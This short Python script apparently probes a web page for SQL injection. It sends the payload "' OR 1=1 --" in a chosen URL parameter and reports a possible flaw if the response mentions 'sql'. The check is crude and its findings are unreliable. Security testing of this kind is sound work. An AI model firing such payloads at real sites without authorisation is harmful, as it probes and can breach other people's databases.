import requests

'''
    SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code
    for backend database manipulation to access information that was not intended to be displayed
'''
def test_sql_injection(url, param):
    payload = "' OR 1=1 --"
    # Construct URL with vulnerable parameter
    test_url = f"{url}?{param}={payload}"

    try:
        response = requests.get(test_url)
        if "sql" in response.text.lower():  # Look for common SQL error messages
            return f"Possible SQL Injection at {test_url}"
        else:
            return f"No SQL Injection vulnerability found at {test_url}"
    except Exception as e:
        return f"Error testing SQL Injection: {e}"


# Example Usage
#print(test_sql_injection("http://example.com/search", "query"))